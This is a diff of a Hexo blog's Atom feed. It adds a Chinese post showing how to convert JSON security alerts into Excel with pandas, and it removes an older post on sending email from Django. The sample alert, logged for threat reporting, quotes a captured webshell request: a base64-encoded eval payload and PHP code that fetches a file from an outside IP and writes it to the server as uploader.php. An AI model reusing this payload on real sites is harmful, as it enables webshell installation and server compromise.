@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://xiejava.gitee.io/"/>
-  <updated>2023-05-15T06:41:20.144Z</updated>
+  <updated>2023-08-18T06:39:21.232Z</updated>
   <id>https://xiejava.gitee.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Python三行代码实现json转Excel</title>
+    <link href="https://xiejava.gitee.io/posts/213c546f/"/>
+    <id>https://xiejava.gitee.io/posts/213c546f/</id>
+    <published>2023-08-18T06:33:33.000Z</published>
+    <updated>2023-08-18T06:39:21.232Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。<br>用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。<br>实现如下：</p><h2 id="一、引包"><a href="#一、引包" class="headerlink" title="一、引包"></a>一、引包</h2><p>引入pandas包，pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas </span><br><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">json_data=<span class="string">r'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   "msg": "",</span></span><br><span class="line"><span class="string">   "killChain": "02",</span></span><br><span class="line"><span class="string">   "attackIllustration": "1起恶意盲打木马写入攻击",</span></span><br><span class="line"><span class="string">   "traceSourceFlag": "01",</span></span><br><span class="line"><span class="string">   "riskLevel": "02",</span></span><br><span class="line"><span class="string">   "holeType": "",</span></span><br><span class="line"><span class="string">   "discoveryTime": "2023-08-15 14:36:23",</span></span><br><span class="line"><span class="string">   "disposalMeasure": "01",</span></span><br><span class="line"><span class="string">   "informationSource": "长亭WAF",</span></span><br><span class="line"><span class="string">   "disposalSuggestion": "建议封禁",</span></span><br><span class="line"><span class="string">   "riskLevelPredue": "",</span></span><br><span class="line"><span class="string">   "impactFlag": "02",</span></span><br><span class="line"><span class="string">   "disposalOperateRecord": "WAF封禁",</span></span><br><span class="line"><span class="string">   "serialNo": "ABC123",</span></span><br><span class="line"><span class="string">   "sourceIpBelong": "美国",</span></span><br><span class="line"><span class="string">   "potentialImpact": "无",</span></span><br><span class="line"><span class="string">   "sourceIpType": "04",</span></span><br><span class="line"><span class="string">   "protocalType": "HTTP",</span></span><br><span class="line"><span class="string">   "disposalFlag": "01",</span></span><br><span class="line"><span class="string">   "groupOrderType": "1",</span></span><br><span class="line"><span class="string">   "comment": "通过微步溯源，IP归属地是美国",</span></span><br><span class="line"><span class="string">   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",</span></span><br><span class="line"><span class="string">   "taskId": "",</span></span><br><span class="line"><span class="string">   "status": ""</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">dic_data = json.loads(json_data,strict=<span class="literal">False</span>)</span><br><span class="line">df_data=pd.DataFrame(dic_data,index=[<span class="number">0</span>])</span><br><span class="line">df_data.to_excel(<span class="string">'attack.xlsx'</span>)</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230818/json%E8%BD%ACexcel.png" alt="json转excel"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于<br><code>json.decoder.JSONDecodeError: Expecting &#39;,&#39; delimiter: line 50 column 149 (char 1339)</code>的错误。所以需要在字符串前面加<code>r</code>标识来忽略掉转义机制。</p><p>常见的字符串标识<code>u,r,b,f</code></p><ul><li>字符串前加u<br>后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>字符串前加r<br>去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）</li><li>字符串前加b<br>b前缀表示：后面字符串是bytes 类型。</li><li>字符串前加f<br>以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。<br>如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'xiejava'</span></span><br><span class="line">outputstr=<span class="string">f'My name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">print(outputstr)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiejava</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。&lt;br&gt;用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
+    
+  </entry>
   
   <entry>
     <title>网络安全之互联网暴露资产端口</title>
@@ -540,34 +568,6 @@
       <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
     
       <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
-    
-    
-      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
-    
-      <category term="Django" scheme="https://xiejava.gitee.io/tags/Django/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>通过Django发送邮件</title>
-    <link href="https://xiejava.gitee.io/posts/73474fe7/"/>
-    <id>https://xiejava.gitee.io/posts/73474fe7/</id>
-    <published>2022-12-30T06:57:46.000Z</published>
-    <updated>2023-03-05T04:58:48.369Z</updated>
-    
-    <content type="html"><![CDATA[<p>通过Django发送邮件非常的简单，在Python中已经内置了一个smtplib邮件发送模块，Django在此基础上进行了简单地封装，我们可以在Django的环境中方便的发送邮件。大部分邮件发送成功主要是邮件的参数配置，本文以常用的126邮箱和QQ邮箱为例介绍Django发送邮件的配置，其他提供smtp邮件服务的邮箱都是一样的。</p><h2 id="一、Django邮件配置"><a href="#一、Django邮件配置" class="headerlink" title="一、Django邮件配置"></a>一、Django邮件配置</h2><p>用Django发送邮件需要告诉你的邮件服务器相应的参数配置，需要在settings.py中进行配置好。<br>默认情况下，使用配置文件中的<code>EMAIL_HOST</code>和<code>EMAIL_PORT</code>设置SMTP服务器主机和端口，<code>EMAIL_HOST_USER</code>和<br><code>EMAIL_HOST_PASSWORD</code>是用户名和密码。如果设置了EMAIL_USE_TLS和EMAIL_USE_SSL，它们将控制是否使用相应的加密链接。<br>典型的配置如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></span><br><span class="line">EMAIL_HOST = <span class="string">'smtp.126.com'</span>      <span class="comment">#126邮箱的邮箱服务地址</span></span><br><span class="line">EMAIL_PORT = <span class="number">25</span>          <span class="comment">#端口，大部分都是默认25</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">'yourmail@126.com'</span>    <span class="comment">#这里是你的邮箱账号</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">'yourpassword'</span>   <span class="comment">#注意这里不能用你邮箱账号的密码，而要用申请的设备授权码。</span></span><br></pre></td></tr></table></figure><p>这里要注意的两个地方，一个是EMAIL_PORT端口、一个是EMAIL_HOST_PASSWORD密码。<br>端口一般默认是25，但有些邮箱改了默认端口或需要用加密链接465、578端口，可以从邮件服务商查到。<br>密码以前可以用邮箱账号密码，但这几年随着安全要求的提高，大部分主要的邮件服务提供商都要用申请的授权码进一步加强安全系数。<br>这里介绍这些关键的信息如何在邮件服务商获取。</p><blockquote><p> <code>注意EMAIL_HOST_PASSWORD这里不能用你邮箱账号的密码，而要用申请的设备授权码。</code></p></blockquote><h3 id="126邮箱"><a href="#126邮箱" class="headerlink" title="126邮箱"></a>126邮箱</h3><p>进入到邮箱配置界面，点击“POP3/SMTP/IMAP”，注意要开启SMTP。<br><img src="https://img-blog.csdnimg.cn/01e56aa8fcd4445d83f7d4363176c4d4.png" alt="126邮箱配置界面"></p><p>授权码是用于登录第三方邮件客户端的专用密码，点击”新增授权密码”，降会弹出一个账号安全验证，扫描后可以快速的发短信。<br><img src="https://img-blog.csdnimg.cn/e832aa92deae43348df02688c1df1a38.png" alt="账号安全验证界面"></p><p>用你的注册手机发完短信后点击”我已发送”就会弹出一个授权码的窗口，要把这个授权码记下来，这个窗口只显示一次。<br><img src="https://img-blog.csdnimg.cn/c7b70b42ca7f4dcb9f5c7cfbc175e642.png" alt="授权码显示界面"></p><h3 id="QQ邮箱"><a href="#QQ邮箱" class="headerlink" title="QQ邮箱"></a>QQ邮箱</h3><p>进入到QQ邮箱WEB界面后点击“设置”，点击“邮件设置”的“账户”页签拉到“账户安全”处就可以看到相关的SMTP服务信息</p><p><img src="https://img-blog.csdnimg.cn/0930d68e01c8495fa3c61882e941793b.png" alt="QQ邮箱配置界面"></p><p>点击“生成授权码”，将弹出验证密保的界面。<br><img src="https://img-blog.csdnimg.cn/70d5db3bcfee4daf8bb8fb199f8093fd.png" alt="验证密保界面"><br>根据提示发送短信后，点击我已发送，将会弹出生成授权码的界面显示授权码。<br><img src="https://img-blog.csdnimg.cn/a1779932a52544ee80fd34074eb57faf.png" alt="授权码生成界面"></p><p>如果需要SSL加密方式，可以进一步查看服务商的SMTP服务说明<br>如QQ邮箱的服务说明 <a href="https://service.mail.qq.com/cgi-bin/help?subtype=1&&id=28&&no=331" target="_blank" rel="noopener">https://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=28&amp;&amp;no=331</a><br><img src="https://img-blog.csdnimg.cn/a8a2c3710e6844cdb132a2e29a064568.png" alt="服务说明界面"></p><p>看到使用SSL，端口号是465或587</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></span><br><span class="line">EMAIL_HOST = <span class="string">'smtp.qq.com'</span>  <span class="comment">#QQ邮箱的smtp服务器</span></span><br><span class="line">EMAIL_PORT = <span class="number">465</span>           <span class="comment">#端口为465或587</span></span><br><span class="line">EMAIL_USE_SSL = <span class="literal">True</span>    <span class="comment">#SSL加密方式设置为True</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">'yourmail@qq.com'</span>     <span class="comment">#这里是你的邮箱账号</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">'yourpassword'</span>   <span class="comment">#注意这里不能用你邮箱账号的密码，而要用申请的设备授权码。</span></span><br></pre></td></tr></table></figure><h2 id="二、测试发送邮件"><a href="#二、测试发送邮件" class="headerlink" title="二、测试发送邮件"></a>二、测试发送邮件</h2><p>可以用django的环境在shell中测试。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py shell</span><br><span class="line">from django.core.mail import send_mail</span><br><span class="line">send_mail(<span class="string">'test'</span>,<span class="string">'this is test mail'</span>,<span class="string">'yourmail@qq.com'</span>,[<span class="string">'yourmail@126.com'</span>,<span class="string">'yormail@qq.com'</span>])</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/85b59a9da2ad450793807d3e4260e8f6.png" alt="在这里插入图片描述"></p><p>如果反回1就表示发送成功了, 查收邮件到达。</p><p>如果发送不成功，请仔细核对邮箱服务的相关配置，一般来说与django无关。</p><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;通过Django发送邮件非常的简单，在Python中已经内置了一个smtplib邮件发送模块，Django在此基础上进行了简单地封装，我们可以在Django的环境中方便的发送邮件。大部分邮件发送成功主要是邮件的参数配置，本文以常用的126邮箱和QQ邮箱为例介绍Django发
-      
-    
-    </summary>
-    
-    
-      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
     
     
       <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
